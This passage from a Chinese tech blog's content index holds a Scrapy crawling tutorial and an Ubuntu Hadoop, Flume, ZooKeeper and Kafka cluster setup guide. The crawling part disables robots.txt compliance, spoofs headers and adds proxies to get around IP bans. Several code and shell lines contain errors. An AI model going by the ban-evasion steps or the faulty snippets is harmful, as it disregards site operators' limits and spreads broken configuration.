= 2\n\n    def parse(self, response):\n        title_list = response.xpath('/html/body/section/div/div/article[1]/header/h2/a/text()')\n        for title in title_list:\n            title = title.extract()\n            item = HandreqItem()\n            item['title'] = title\n            yield item\n\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n            # scrapy.FormRequest(url,callback,formdata) 发送post请求\n\n```\n\n## 五大核心组件工作流程\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151340834.png?token=ARYCSAUIENI4WQ2X26Z4EQ3CQCJIM)\n\n引擎(Scrapy)\n\n    用来处理整个系统的数据流处理, 触发事务(框架核心)\n\n调度器(Scheduler)\n\n    用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址\n\n下载器(Downloader)\n\n    用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)\n\n爬虫(Spiders)\n\n    爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面\n\n项目管道(Pipeline)\n\n    负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。\n\n## 请求传参的深度爬取-4567kan.com\n\n文件目录\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151341626.png?token=ARYCSAWOAVW6ADT6LYL7NY3CQCJMU)\n\n    meta是一个字典,可以将meta传给callback\n        scrapy.Request(url, callback, meta)\n\n    callback取出字典\n        item = response.meta['item']\n\nmove.py 项目文件\n\n```python\nimport scrapy\nfrom move_4567kan.items import Move4567KanItem\n\n\nclass MoveSpider(scrapy.Spider):\n    name = 'move'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.4567kan.com/frim/index1-1.html']\n\n    # 构造页码\n    url = 'https://www.4567kan.com/frim/index1-%d.html'\n    page_num = 2\n\n    def parse(self, response):\n        # 抓取url和title\n        li_list = response.xpath('/html/body/div[2]/div/div[3]/div/div[2]/ul/li')\n        for li in li_list:\n            url = 'https://www.4567kan.com' + li.xpath('./div/a/@href').extract()[0]\n            title = li.xpath('./div/a/@title').extract()[0]\n\n            # 传递给item\n            item = Move4567KanItem()\n            item['title'] = title\n\n            # 对详情页发起请求,回调get_details函数\n            # meta请求传参,以字典形式,传给get_details函数,因为item只能是唯一\n            yield scrapy.Request(url=url, callback=self.get_details, meta={'item': item})\n\n        # 爬取多页\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n\n    # 自定义函数去抓取详情\n    def get_details(self, response):\n        details = response.xpath('//*[@class=\"detail-content\"]/text()').extract()\n        # 判断,没有返回None\n        if details:\n            details = details[0]\n        else:\n            details = None\n        # 接受item\n        item = response.meta['item']\n        item['details'] = details\n        # 提交给管道\n        yield item\n\n```\n\nitems.py 定义两个字段\n\n```python\nimport scrapy\n\n\nclass Move4567KanItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    details = scrapy.Field()\n\n```\n\npipelines.py 打印输出\n\n```python\nclass Move4567KanPipeline:\n    def process_item(self, item, spider):\n        print(item)\n        return item\n\n```\n\n## 中间件\n\n作用\n\n    拦截请求和响应\n\n爬虫中间件\n\n    略\n\n下载中间件(推荐)\n\n    拦截请求:    \n        1.篡改请求url\n        2.伪装请求头信息:\n            UA\n            Cookie\n        3.设置请求代理\n\n    拦截响应:\n        篡改响应数据\n\n改写中间件文件 middlewares.py\n\n```python\n\nfrom scrapy import signals\nfrom itemadapter import is_item, ItemAdapter\n\n\nclass MiddleDownloaderMiddleware:\n\n    # 拦截所有请求\n    # request就是拦截到的请求,spider就是爬虫类实例化的对象\n    def process_request(self, request, spider):\n        print('我是process_request()')\n        return None\n\n    # 拦截所有响应对象\n    # request就是response响应对象对应的请求对象,response就是拦截到的响应对象\n    def process_response(self, request, response, spider):\n        print('我是process_response()')\n        return response\n\n    # 拦截异常请求\n    # request就是拦截到的异常请求的请求对象\n    # 作用:修正异常请求,将其 重新发送\n    def process_exception(self, request, exception, spider):\n        print('我是process_exception()')\n        # pass\n```\n\n编写爬虫文件\n\n```python\nimport scrapy\n\n\nclass MidSpider(scrapy.Spider):\n    name = 'mid'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.baidu.com', 'https://www.sogou.com']\n\n    def parse(self, response):\n        print(response)\n\n```\n\n在配置文件setting.py中启用\n\n```python\nROBOTSTXT_OBEY = True\n\nDOWNLOADER_MIDDLEWARES = {\n    'middle.middlewares.MiddleDownloaderMiddleware': 543,\n}\n```\n\n启动工程\n\n```bash\nchenci@MacBook-Pro middle %scrapy crawl mid\n我是process_request()\n我是process_request()\n我是process_response()\n我是process_exception()\n我是process_response()\n我是process_exception()\n```\n\nprocess_exception()方法设置代理\n\n```python\n# 拦截异常请求\n# request就是拦截到的异常请求的请求对象\n# 作用:修正异常请求,将其 重新发送\ndef process_exception(self, request, exception, spider):\n    # 请求的ip被禁,该请求就会变成一个异常请求,加入代理\n    request.meta['proxy_'] = 'https://ip:port'\n    print('我是process_exception()')\n    # 将异常的请求修正后重新发送\n    return request\n    # 可能会造成死循环,因为如果加入代理后依旧发生异常,会再次加入代理去请求\n```\n\nprocess_request()方法设置headers\n\n```python\ndef process_request(self, request, spider):\n    # 设置请求头,但一般不这么写,可以在setting.py中设置全局\n    request.headers['User-Agent'] = 'xxx'\n    request.headers['Cookie'] = 'xxx'\n    print('我是process_request()')\n    return None\n```\n\nprocess_response()方法篡改响应数据\n\n```python\n# 拦截所有响应对象\n# request就是response响应对象对应的请求对象,response就是拦截到的响应对象\ndef process_response(self, request, response, spider):\n    # 篡改响应数据\n    response.text = 'xxx'\n    print('我是process_response()')\n    return response\n```\n\n## 大文件下载-爬取jdlingyu.com图片\n\n文件目录\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151342799.png?token=ARYCSAQF2H5ORVGMPC5ZA6TCQCJQG)\n\nimg.py\n\n```python\nimport scrapy\nfrom imgdownload.items import ImgdownloadItem\n\n\nclass ImgSpider(scrapy.Spider):\n    name = 'img'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.jdlingyu.com']\n\n    def parse(self, response):\n        li_list = response.xpath('/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li')\n        for a in li_list:\n            url = a.xpath('./div/div[2]/h2/a/@href').extract()[0]\n            title = a.xpath('./div/div[2]/h2/a/text()').extract()[0]\n\n            # 传递给itme\n            item = ImgdownloadItem()\n            item['title'] = title\n\n            # 回调并传递参数\n            yield scrapy.Request(url=url, callback=self.get_img_url, meta={'item': item})\n\n    # 对每个图集的url发起请求\n    def get_img_url(self, response):\n        page = 0\n        item = response.meta['item']\n        # 抓取每张图片的下载链接\n        img_list = response.xpath('//*[@id=\"primary-home\"]/article/div[2]/img')\n        for scr in img_list:\n            img_url = scr.xpath('./@src').extract()[0]\n            page += 1\n            # 传递给item\n            item['img_url'] = img_url\n            item['page'] = page\n            # 提交给管道\n            yield item\n\n```\n\nsetting.py增加配置\n\n```python\nUSER_AGENT = 'ua'\nROBOTSTXT_OBEY = False\nLOG_LEVEL = 'ERROR'\n# 图片存放目录\nIMAGES_STORE = './imgs'\n\n```\n\nitems.py增加字段\n\n```python\nimport scrapy\n\n\nclass ImgdownloadItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    img_url = scrapy.Field()\n    page = scrapy.Field()\n```\n\npipelines.py增加管道类\n```python\nimport scrapy\nfrom itemadapter import ItemAdapter\n\n# 默认管道类无法请求图片数据\nclass ImgdownloadPipeline:\n    def process_item(self, item, spider):\n        return item\n\n\n# 接受图片地址和title,然后对其进行请求存储到本地\n# 提供了数据下载功能,也可以下载视频和音频\nfrom scrapy.pipelines.images import ImagesPipeline\n\n\n# 继承ImagesPipeline类\nclass img_download(ImagesPipeline):\n    # 重写三个父类方法\n    def get_media_requests(self, item, info):\n        # 下载,并传参,如果传递整个item,最后只会下载一张图片,原因未知\n        yield scrapy.Request(url=item['img_url'], meta={'title': item['title'], 'page': item['page']})\n\n    # 返回图片保存路径\n    def file_path(self, request, response=None, info=None, *, item=None):\n        # 拼接路径\n        title = request.meta['title']\n        page = request.meta['page']\n        path = f'{title}/{page}.jpg'\n\n        # 返回路径\n        return path\n\n    # 将item返回给下一个即将被执行的管道类\n    def item_completed(self, results, item, info):\n        return item\n```\n\nsetting.py增加管道类\n```python\nITEM_PIPELINES = {\n   #'imgdownload.pipelines.ImgdownloadPipeline': 300,\n   'imgdownload.pipelines.img_download': 300,\n}\n```\n\n运行效果\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151342947.png?token=ARYCSATQHIG5XPI3W7VHBBTCQCJR2)\n\n## CrawlSpider 深度爬取\n是什么\n\n    是Spider的一个子类,也就是爬虫文件的父类\n    \n作用:用作于全站数据的爬取\n    \n    将一个页面下所有的页码进行爬取\n\n基本使用\n    \n    1.创建一个工程\n    2.创建一个基于CrawlSpider类的爬虫文件\n        crapy genspider -t crawl main www.xxx.com\n    3.执行工程\n\n编写工程文件main.py\n```python\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\n\n\nclass MainSpider(CrawlSpider):\n    name = 'main'\n    #allowed_domains = ['https://www.mn52.com/']\n    start_urls = ['https://www.mn52.com/fj/']\n\n    # 链接提取器,根据allow里的正则来提取url\n    rules = (\n        # 对提取的url发起请求,然后回调解析\n        # 如果allow为空 将抓取此页面下的链接\n        Rule(LinkExtractor(allow=r'list_8_\\d.html'), callback='parse_item', follow=True),\n    )\n\n    def parse_item(self, response):\n        print(response)\n        item = {}\n        return item\n\n```\n执行工程\n    \n    可以看到抓取了所有页码的url\n```bash\nchenci@MacBook-Pro crawl %scrapy crawl main\n<200 https://www.mn52.com/fj/list_8_2.html>\n<200 https://www.mn52.com/fj/list_8_3.html>\n<200 https://www.mn52.com/fj/list_8_4.html>\n<200 https://www.mn52.com/fj/list_8_8.html>\n<200 https://www.mn52.com/fj/list_8_5.html>\n<200 https://www.mn52.com/fj/list_8_7.html>\n<200 https://www.mn52.com/fj/list_8_9.html>\n<200 https://www.mn52.com/fj/list_8_6.html>\n```\n\n\n","tags":["教程","爬虫","scrapy"],"categories":["爬虫"]},{"title":"ubuntu下大数据集群搭建","url":"/2022/03/01/ubuntu下hadoop集群搭建/","content":"### 一.配置ip(三个节点)\n自ubuntu17之后多了一种配置方式更加高效,也就是netplan\n\n1.1编辑配置文件\n```bash\nroot@master:/etc/netplan# gedit /etc/netplan/01-network-manager-all.yaml\n```\n配置内容如下,`注意缩进`\n```yaml\nnetwork:\n version: 2\n renderer: NetworkManager\n ethernets:\n    ens33:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.10.101/24]\n      gateway4: 192.168.10.1\n      nameservers:\n        addresses: [8.8.8.8, 192.168.10.1]\n```\n1.2使配置生效\n```bash\nroot@master:/etc/netplan# netplan apply\n```\n如果没有报错则配置成功\n\n### 二.配置主机名和主机名映射(三个节点)\n1.1配置主机名并查看\n```bash\n重启后生效\nroot@master:/etc/netplan# hostnamectl set-hostname master\nroot@master:/etc/netplan# hostname\n```\n1.2配置主机名映射\n```bash\nroot@master:/etc/netplan# gedit /etc/hosts\n```\n添加以下内容\n```bash\n192.168.10.101 master\n192.168.10.102 slave1\n192.168.10.103 slave2\n```\n1.3ping测试\n```bash\n有以下回显证明配置成功\nroot@master:/etc/netplan# ping slave2\nPING slave2 (192.168.10.103) 56(84) bytes of data.\n64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms\n```\n1.4将hosts文件分发给子节点\n```bash\nroot@master:/etc/netplan# scp /etc/hosts root@slave1:/etc/\n输入yes再输入密码\n```\n\n### 三.配置ssh免密登录(三个节点)\n因为Ubuntu并不自带ssh服务所以要安装ssh并配置允许root远程登录\n```bash\n下载\nsudo apt-get install openssh-server\n启动\nsudo service ssh start\n配置\nsudo vim /etc/ssh/sshd_config\n添加一条\nPermitRootLogin yes\n```\n1.生成密钥\n```bash\nroot@master:~# ssh-keygen -t rsa\n一直回车\n```\n2.将密钥写入authorized.keys文件\n```bash\nroot@master:~# cd .ssh/\nroot@master:~/.ssh# cat id_rsa.pub >> authorized_keys\n\n```\n3.在另外两个子节点执行以上操作,并将authorized.keys的内容复制进master主机的authorized.keys文件末尾,成功后如下\n```bash\nroot@master:~/.ssh# cat authorized.keys \nssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master\nssh-dss AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1\nssh-dss AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2\n```\n4.分发给另外两台子节点\n```bash\nroot@master:~/.ssh# scp ./authorized.keys root@slave1:/root/.ssh/\nroot@master:~/.ssh# scp ./authorized.keys root@slave2:/root/.ssh/\n```\n5.测试免密登录\n```bash\nssh master\nssh slave1\nssh slave2\n```\n### 四.安装jdk\n1.解压\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# tar -zxvf jdk-8u11-linux-x64.tar.gz\n```\n2.分发给其余子节点\n```bash\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/\n```\n3.配置环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# gedit /root/.bashrc \n```\n配置如下\n```bash\n#JAVA_HOME\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\nexport PATH=$JAVA_HOME/bin:$PATH\n```\n分发给其他节点,也可以直接配置\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave2:/root/\n```\n4.刷新环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# source /root/.bashrc \n```\n5.测试\n如下回显则表示成功\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# java -version\njava version \"1.8.0_11\"\nJava(TM) SE Runtime Environment (build 1.8.0_11-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)\n```\n### 五.安装hadoop\n1.解压\n```bash\nroot@master:~/software/hadoop# tar -zxvf hadoop-2.7.3.tar.gz\n```\n2.配置环境变量\n```bash\nroot@master:~/software/hadoop# gedit /root/.bashrc \n```\n配置如下\n```bash\n#HADOOP_HOME\nexport HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3\nexport PATH=$HADOOP_HOME/bin:$HADOOP/sbin:$PATH\n```\n分发给子节点\n```bash\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave2:/root/\n```\n刷新环境变量\n```bash\nroot@master:~/software/hadoop# source /root/.bashrc \n```\n3.创建hadoopdata目录\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3# mkdir hadoopdata\n```\n4.配置hadoop-env.sh文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cd etc/hadoop/\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hadoop-env.sh \n```\n```bash\n找到\nexport JAVA_HOME=${JAVA_HOME}\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n5.配置yarn-env.sh\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-env.sh \n```\n```bash\n找到\n#export JAVA_HOME=/home/y/libexec/jdk1.6.0/\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n6.配置核心组件core-site.xml \n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit core-site.xml \n```\n```xml\n<configuration>\n<property>\n<name>fs.defaultFS</name>\n<value>hdfs://master:9000</value>\n</property>\n<property>\n<name>hadoop.tmp.dir</name>\n<value>/root/software/hadoop/hadoop-2.7.3/hadoopdata</value>\n</property>\n</configuration>\n```\n7.配置配置文件系统hdfs-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hdfs-site.xml \n```\n```xml\n<configuration>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.rpc-address</name>\n\t\t<value>master:50071</value>\n\t</property>\n</configuration>\n```\n8.配置文件系统yarn-site.xm\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-site.xml\n```\n```xml\n<configuration>\n<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n                <name>yarn.resourcemanager.address</name>\n                <value>master:18040</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.scheduler.address</name>\n                <value>master:18030</value>\n        </property>\n\t<property>\n                <name>yarn.resourcemanager.resource-tracker.address</name>\n                <value>master:18025</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.admin.address</name>\n                <value>master:18141</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.webapp.address</name>\n                <value>master:18088</value>\n        </property>\n\n</configuration>\n```\n9.配置计算框架mapred-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cp mapred-site.xml.template mapred-site.xml\n\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit mapred-site.xml\n```\n```xml\n<configuration>\n<property>\n<name>mapreduce.framework.name</name>\n<value>yarn</value>\n</property>\n</configuration>\n```\n10.配置slaves文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit slaves \n```\n```bash\nmaster\nslave1\nslave2\n```\n11.分发给子节点\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/\n```\n12.格式化namanode\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# hdfs namenode -format\n```\n13.启动hadoop\n```bash\n进入sbin目录下执行\n\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# ./start-all.sh \n\n执行命令后，提示出入yes/no时，输入yes。\n```\n14.测试\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n```\n有以下进程表示搭建成功!\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n4848 SecondaryNameNode\n4999 ResourceManager\n4489 NameNode\n4650 DataNode\n5423 Jps\n5135 NodeManager\n```\n15.web端查看\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:50070/,有如下回显表示成功\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151354214.png?token=ARYCSATWRJAZNISFMK2R4I3CQCK5S)\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:18088/，检查 Yarn是否正常，页面如下图所示。\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151354984.png?token=ARYCSAVJG5SWWAXSUBPQ7UDCQCK7C)\n### 六.flume安装与配置\n\n1.解压\n```bash\ntar -zxvf apache-flume-1.7.0-bin.tar.gz \n```\n2.配置环境变量\n```bash\n#FLUME_HOME\nexport FLUME_HOME=/root/software/flume-1.7.0\nexport PATH=$FLUME_HOME/bin:$PATH\n```\n3.复制配置文件\n```bash\ncp flume-env.sh.template flume-env.sh\n```\n修改\n```bash\n# export JAVA_HOME=/usr/lib/jvm/java-6-sun\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n4.配置配置文件\n```bash\nsource: 数据的入口,规定了数据收集的入口规范\nchannel: 管道,存储数据用的\nskin: 数据的出口,规定了数据收集的出口规范\nagent: 一个任务,包含了source,channel,skin\n\n```\n\n```bash\ncp flume-conf.properties.template flume-conf.properties\n```\n修改为\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n# Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n5.启动\n```bash\n./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console\n```\n6.nc测试\n```bash\nnc localhost 44444\n```\n7.案例一\n监听文件内容变动，将新增加的内容输出到控制台。\n新建配置文件 exec-memory-logger.properties,其内容如下：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\n\n#将sources与channels进行绑定\na1.sources.s1.channels = c1\n   \n#配置sink \na1.sinks.k1.type = logger\n\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1  \n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n8.案例二\n监听指定端口,将这个向这个端口写入的数据输出到控制台\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = 192.168.32.130\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transctionCapacity = 100\n\n#Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n9.案例三\n监听指定目录，将目录下新增加的文件存储到 HDFS。\n新建配置文件spooling-memory-hdfs.properties\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type =spooldir  \na1.sources.s1.spoolDir =/tmp/logs\na1.sources.s1.basenameHeader = true\na1.sources.s1.basenameHeaderKey = fileName \n#将sources与channels进行绑定  \na1.sources.s1.channels =c1 \n\n   \n#配置sink \na1.sinks.k1.type = hdfs\na1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/\na1.sinks.k1.hdfs.filePrefix = %{fileName}\n#生成的文件类型，默认是Sequencefile，可用DataStream，则为普通文本\na1.sinks.k1.hdfs.fileType = DataStream  \na1.sinks.k1.hdfs.useLocalTimeStamp = true\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1\n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n\n10.案例四\n将本服务器收集到的数据发送到另外一台服务器。\n新建配置 netcat-memory-avro.properties，监听文件内容变化，然后将新的文件内容通过 avro sink 发送到 hadoop001 这台服务器的 8888 端口：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1\na1.sinks = k1\na1.channels = c1\n\n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\na1.sources.s1.channels = c1\n\n#配置sink\na1.sinks.k1.type = avro\na1.sinks.k1.hostname = hadoop001\na1.sinks.k1.port = 8888\na1.sinks.k1.batch-size = 1\na1.sinks.k1.channel = c1\n\n#配置channel类型\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n```\n配置日志聚合Flume\n使用 avro source 监听 hadoop001 服务器的 8888 端口，将获取到内容输出到控制台\n```bash\n#指定agent的sources,sinks,channels\na2.sources = s2\na2.sinks = k2\na2.channels = c2\n\n#配置sources属性\na2.sources.s2.type = avro\na2.sources.s2.bind = hadoop001\na2.sources.s2.port = 8888\n\n#将sources与channels进行绑定\na2.sources.s2.channels = c2\n\n#配置sink\na2.sinks.k2.type = logger\n\n#将sinks与channels进行绑定\na2.sinks.k2.channel = c2\n\n#配置channel类型\na2.channels.c2.type = memory\na2.channels.c2.capacity = 1000\na2.channels.c2.transactionCapacity = 100\n\n```\n这里建议先启动a2，原因是 avro.source 会先与端口进行绑定，这样 avro sink 连接时才不会报无法连接的异常。但是即使不按顺序启动也是没关系的，sink 会一直重试，直至建立好连接。\n\n### 七.Zookeeper安装配置\n1.解压并配置环境变量\n```bash\n#ZOOKEEPER_HOME\nexport ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0\nexport PATH=$ZOOKEEPER_HOME/bin:$PATH\n```\n\n2.新建一个目录用来存放数据\n```bash\nmkdir /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n3.编辑配置文件\n复制一份配置文件,并替换内容\n```bash\ncp zoo_sample.cfg zoo.cfg\n```\n```bash\ndataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n4.启动\n```bash\n ./zkServer.sh start\n```\n\n### 八.kafka安装配置与使用\n1.解压并配置环境变量\n```bash\n#KAFKA_HOME\nexport KAFKA_HOME=/root/software/kafka_2.11-2.0.0\nexport PATH=$KAFKA_HOME/bin:$PATH\n```\n2.创建日志文件夹\n```bash\nmkdir /root/software/kafka_2.11-2.0.0/kafka-logs\n```\n3.config文件夹中修改配置文件以下几项\n```bash\ngedit server.properties \n```\n```bash\nlog.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs\n\nlisteners=PLAINTEXT://localhost:9092\n```\n4.启动kafka\n启动kafka之前要先启动zookeeper\n```bash\n kafka-server-start.sh ./config/server.properties\n```\n5.创建topic主题\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1\n```\n6.查看\n```bash\n kafka-topics.sh --list --zookeeper localhost:2181\n```\n7.生产消息\n```bash\n kafka-console-producer.sh --broker-list localhost:9092 --topic 